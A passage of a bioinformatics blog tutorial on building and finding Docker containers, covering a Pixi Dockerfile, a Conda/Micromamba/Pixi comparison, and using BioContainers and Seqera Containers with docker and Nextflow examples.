class="token instruction options property" style="color:hsl(5, 74%, 59%)">--chmod</span><span class="token instruction options punctuation" style="color:hsl(119, 34%, 47%)">=</span><span class="token instruction options string" style="color:hsl(119, 34%, 47%)">0555</span><span class="token instruction"> /pixi /usr/local/bin/pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Set up pixi with conda channels</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">ENV</span><span class="token instruction"> PATH=</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/home/appuser/.pixi/bin:${PATH}"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> pixi config set default-channels </span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">'["conda-forge", "bioconda"]'</span><span class="token instruction"> --global</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install tools using pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> pixi global install fastqc=0.12.1 samtools=1.18 bwa=0.7.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Clean cache</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">RUN</span><span class="token instruction"> pixi clean cache -y</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">WORKDIR</span><span class="token instruction"> /data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token instruction keyword" style="color:hsl(301, 63%, 40%)">CMD</span><span class="token instruction"> [</span><span class="token instruction string" style="color:hsl(119, 34%, 47%)">"/bin/bash"</span><span class="token instruction">]</span><br></span></code></pre></div></div>
<p><strong>Key Pixi Features in the Dockerfile:</strong></p>
<ul>
<li class=""><strong>Multi-stage build:</strong> Builder stage compiles Pixi, final stage is lean</li>
<li class=""><strong>User management:</strong> Non-root appuser for security</li>
<li class=""><strong>Global channel setup:</strong> Pre-configures conda-forge and bioconda channels</li>
<li class=""><strong>Direct package installation:</strong> <code>pixi global install</code> installs and locks versions automatically</li>
<li class=""><strong>Automatic lock file:</strong> Lock file is generated implicitly, ensuring reproducibility</li>
<li class=""><strong>Cache cleaning:</strong> <code>pixi clean cache -y</code> removes temporary files</li>
</ul>
<p><strong>Comparing Container Tools:</strong></p>
<table><thead><tr><th>Feature</th><th>Conda</th><th>Micromamba</th><th>Pixi</th></tr></thead><tbody><tr><td><strong>Speed</strong></td><td>Slow (baseline)</td><td>10-100x faster</td><td>100x+ faster</td></tr><tr><td><strong>Lock file</strong></td><td>Manual export</td><td>Manual export</td><td>Automatic</td></tr><tr><td><strong>Image size</strong></td><td>Large</td><td>Small</td><td>Small</td></tr><tr><td><strong>Reproducibility</strong></td><td>Good</td><td>Excellent</td><td>Excellent</td></tr><tr><td><strong>Complexity</strong></td><td>High</td><td>Medium</td><td>Low</td></tr><tr><td><strong>Learning curve</strong></td><td>Steep</td><td>Medium</td><td>Low</td></tr><tr><td><strong>Production-ready</strong></td><td>Yes</td><td>Yes</td><td>Emerging</td></tr></tbody></table>
<p><strong>Summary:</strong></p>
<ul>
<li class="">Use <code>conda.yml</code> with Micromamba for established, proven workflows</li>
<li class="">Use Pixi for cutting-edge projects requiring maximum speed and simplicity</li>
<li class="">Always include <code>procps-ng</code> for Nextflow compatibility (regardless of tool)</li>
<li class="">Generate/maintain explicit lock files for reproducibility</li>
<li class="">Pin exact versions to prevent dependency drift</li>
<li class="">Multi-channel support (conda-forge + bioconda) handles complex dependencies</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-finding-pre-built-containers-before-building-from-scratch">5. Finding Pre-Built Containers: Before Building from Scratch<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#5-finding-pre-built-containers-before-building-from-scratch" class="hash-link" aria-label="Direct link to 5. Finding Pre-Built Containers: Before Building from Scratch" title="Direct link to 5. Finding Pre-Built Containers: Before Building from Scratch" translate="no">​</a></h2>
<p>Before you spend time building Docker images from scratch, check if your tool already exists in a public container registry. Most bioinformatics tools have pre-built, maintained containers ready to use. This is the <strong>fastest and easiest approach</strong> when available.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-container-search-strategy">The Container Search Strategy<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#the-container-search-strategy" class="hash-link" aria-label="Direct link to The Container Search Strategy" title="Direct link to The Container Search Strategy" translate="no">​</a></h3>
<p>Always follow this order:</p>
<ol>
<li class=""><strong>Check BioContainers</strong> (<a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a>) - Most comprehensive bioinformatics registry</li>
<li class=""><strong>Check Seqera Containers</strong> (<a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a>) - Multi-tool combinations, modern builds</li>
<li class=""><strong>Build yourself</strong> - Only if tool doesn't exist</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-biocontainers-primary-source">1. BioContainers (Primary Source)<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#1-biocontainers-primary-source" class="hash-link" aria-label="Direct link to 1. BioContainers (Primary Source)" title="Direct link to 1. BioContainers (Primary Source)" translate="no">​</a></h3>
<p><strong>BioContainers</strong> automatically builds and maintains Docker containers for every bioconda package. This is the most comprehensive source for bioinformatics tools.</p>
<p><strong>URL:</strong> <a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></p>
<p><strong>How to find and use a tool:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Search for FastQC</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> search quay.io/biocontainers/fastqc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pull a specific version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/fastqc:0.12.1--hdfd78af_1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run the tool</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/fastqc:0.12.1--hdfd78af_1 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc /data/sample.fastq</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="biocontainer" src="https://riverxdata.github.io/river-docs/assets/images/biocontainer_container_registry-72da3ed4ec61f7ab5f175373cd1b0208.png" width="2546" height="1494" class="img_ev3q"></p>
<p><strong>Advantages:</strong></p>
<ul>
<li class="">✅ Automatically updated when bioconda packages update</li>
<li class="">✅ Single-tool containers (clean, minimal)</li>
<li class="">✅ Stable and widely tested</li>
<li class="">✅ Available for most bioinformatics tools (~10,000+)</li>
<li class="">✅ Free and publicly accessible</li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li class="">One tool per image (no multi-tool combinations)</li>
<li class="">Must manually orchestrate multiple containers for pipelines</li>
</ul>
<p><strong>Example with multiple tools in a workflow:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Align reads with BWA</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/bwa:0.7.17--h5bf99c6_8 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    bwa mem /data/ref.fa /data/reads.fq </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /data/aligned.sam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Sort BAM with Samtools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/samtools:1.18--hd87286a_0 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> /data/aligned.sam </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /data/aligned.bam</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-seqera-containers-also-support-multi-tool-option">2. Seqera Containers (Also support Multi-Tool Option)<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#2-seqera-containers-also-support-multi-tool-option" class="hash-link" aria-label="Direct link to 2. Seqera Containers (Also support Multi-Tool Option)" title="Direct link to 2. Seqera Containers (Also support Multi-Tool Option)" translate="no">​</a></h3>
<p><strong>Seqera Containers</strong> provides a registry of pre-built containers that often combine multiple tools, perfect for complex workflows.</p>
<p><strong>URL:</strong> <a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></p>
<p><strong>How to find and use containers:</strong></p>
<ol>
<li class="">Visit <a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></li>
<li class="">Search for your tool(s)</li>
<li class="">Add multiple tools if needed (e.g., <code>fastqc</code> + <code>samtools</code> together)</li>
<li class="">Select your architecture (linux/amd64 or linux/arm64)</li>
<li class="">Get the container reference</li>
</ol>
<p><strong>Example:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Pull a multi-tool container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull wave.seqera.io/library/fastqc:0.12.1-samtools_1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or use in Nextflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process analyzeReads </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'wave.seqera.io/library/fastqc:0.12.1-samtools_1.18'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain">'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastqc input.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools view input.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">''</span><span class="token plain">'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="seqera_container" src="https://riverxdata.github.io/river-docs/assets/images/seqera_container_registry-12220fdc32c49ac10d1a2a5ac24b2b8f.png" width="2546" height="1494" class="img_ev3q">
<strong>Advantages:</strong></p>
<ul>
<li class="">✅ Combines multiple tools in one image</li>
<li class="">✅ Modern infrastructure</li>
<li class="">✅ Web interface for easy discovery</li>
<li class="">✅ Automatic lock file generation</li>
<li class="">✅ Multi-architecture support</li>
</ul>
<p><strong>Limitations:</strong></p>
<ul>
<li class="">Fewer pre-built combinations than BioContainers</li>
<li class="">Relies on Seqera infrastructure</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-when-to-build-from-scratch">3. When to Build from Scratch<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#3-when-to-build-from-scratch" class="hash-link" aria-label="Direct link to 3. When to Build from Scratch" title="Direct link to 3. When to Build from Scratch" translate="no">​</a></h3>
<p>Only build your own container if:</p>
<ol>
<li class=""><strong>Tool doesn't exist</strong> in any public registry</li>
<li class=""><strong>Version not available</strong> and you need an older/newer version</li>
<li class=""><strong>Custom modifications</strong> required (additional dependencies, scripts)</li>
<li class=""><strong>Performance optimizations</strong> needed for specific hardware</li>
</ol>
<p><strong>Example scenario:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check if tool exists</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/myraretool:latest  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># ❌ Not found</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check Seqera Containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Visit https://seqera.io/containers/ - (tool not found)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># → NOW you build it yourself using Section 4 approach</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myregistry.com/myraretool:1.0 </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> push myregistry.com/myraretool:1.0</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quick-reference-where-to-find-each-tool">Quick Reference: Where to Find Each Tool<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#quick-reference-where-to-find-each-tool" class="hash-link" aria-label="Direct link to Quick Reference: Where to Find Each Tool" title="Direct link to Quick Reference: Where to Find Each Tool" translate="no">​</a></h3>
<table><thead><tr><th>Tool Type</th><th>Primary Location</th><th>Alternative</th><th>Fallback</th></tr></thead><tbody><tr><td><strong>Common bioinformatics</strong> (FastQC, SAMtools, BWA, etc.)</td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></td><td><a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></td><td>Build yourself</td></tr><tr><td><strong>R/Bioconductor packages</strong></td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></td><td><a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></td><td>Build yourself</td></tr><tr><td><strong>Python bioinformatics</strong></td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a></td><td><a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a></td><td>Build yourself</td></tr><tr><td><strong>Specialized tools</strong></td><td><a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a> first</td><td>GitHub releases</td><td>Build yourself</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-workflow-search--pull--use">Practical Workflow: Search → Pull → Use<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#practical-workflow-search--pull--use" class="hash-link" aria-label="Direct link to Practical Workflow: Search → Pull → Use" title="Direct link to Practical Workflow: Search → Pull → Use" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Search for tool in BioContainers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">TOOL</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"fastqc"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">VERSION</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"0.12.1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Searching for </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$TOOL</span><span class="token string" style="color:hsl(119, 34%, 47%)">:</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$VERSION</span><span class="token string" style="color:hsl(119, 34%, 47%)"> in BioContainers..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$TOOL</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$VERSION</span><span class="token plain">--* </span><span class="token operator file-descriptor important" style="color:hsl(230, 8%, 24%);font-weight:bold">2</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain">/dev/null </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✓ Found in BioContainers!"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&amp;&amp;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Try Seqera Containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Trying Seqera Containers..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># (Check https://seqera.io/containers/ manually or via API)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Build yourself</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"✗ Not found in public registries. Building from scratch..."</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Use Section 4 approach with Micromamba or Pixi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> build </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> myregistry.com/</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$TOOL</span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$VERSION</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="best-practices-for-using-pre-built-containers">Best Practices for Using Pre-Built Containers<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#best-practices-for-using-pre-built-containers" class="hash-link" aria-label="Direct link to Best Practices for Using Pre-Built Containers" title="Direct link to Best Practices for Using Pre-Built Containers" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Pin exact versions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">✓ Good: </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:1.18--hd87286a_0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">✗ Bad:  </span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:latest</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Check build hash in Nextflow:</strong></p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">process myTask </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)">// Include digest for reproducibility</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    container </span><span class="token string" style="color:hsl(119, 34%, 47%)">'quay.io/biocontainers/samtools:1.18--hd87286a_0@sha256:abc123...'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'samtools view input.bam'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
</li>
<li class="">
